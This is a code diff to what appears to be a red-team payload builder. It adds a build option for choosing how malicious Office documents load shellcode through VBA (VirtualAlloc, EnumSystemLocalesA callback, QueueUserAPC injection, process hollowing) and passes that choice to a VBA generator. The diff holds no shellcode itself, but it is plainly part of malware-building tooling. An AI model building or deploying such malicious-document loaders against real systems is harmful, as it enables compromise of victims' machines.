@@ -738,6 +738,19 @@ generated if none have been entered.""",
             ]
         ),
 
+        BuildParameter(
+            name="7.7 VBA Loader Technique",
+            parameter_type=BuildParameterType.ChooseOne,
+            description="VBA shellcode loader technique - VirtualAlloc (classic), EnumLocales (callback), QueueUserAPC (APC), ProcessHollowing (remote)",
+            choices=["VirtualAlloc + CreateThread", "EnumSystemLocalesA Callback", "QueueUserAPC Injection", "Process Hollowing"],
+            default_value="VirtualAlloc + CreateThread",
+            required=False,
+            hide_conditions=[
+                HideCondition(name="7.0 Create MalDoc", operand=HideConditionOperand.EQ, value=False),
+                HideCondition(name="7.6 MalDoc Injection Type", operand=HideConditionOperand.EQ, value="Command Execution")
+            ]
+        ),
+
     ]
 
     build_steps = [
@@ -1903,12 +1916,23 @@ generated if none have been entered.""",
                         shellcode_vba = subprocess.check_output(cmd, text=True)
                         output += f"[DEBUG] Shellcrypt VBA output length: {len(shellcode_vba)} bytes\n"
 
+                        # Map loader selection to plugin parameter
+                        loader_map = {
+                            "VirtualAlloc + CreateThread": "virtualalloc",
+                            "EnumSystemLocalesA Callback": "enumlocales",
+                            "QueueUserAPC Injection": "queueuserapc",
+                            "Process Hollowing": "hollowing"
+                        }
+                        loader_type = loader_map.get(self.get_parameter("7.7 VBA Loader Technique"), "virtualalloc")
+                        output += f"[DEBUG] Using VBA loader technique: {loader_type}\n"
+
                         # Generate VBA that injects the shellcode
                         from erebus_wrapper.erebus.modules.plugin_payload_maldocs import PayloadMalDocsPlugin
                         plugin = PayloadMalDocsPlugin()
                         vba_code = plugin.generate_shellcode_injection_vba(
                             vba_shellcode=shellcode_vba,
-                            trigger_type=vba_trigger
+                            trigger_type=vba_trigger,
+                            loader_type=loader_type
                         )
                     
                     if obfuscate:
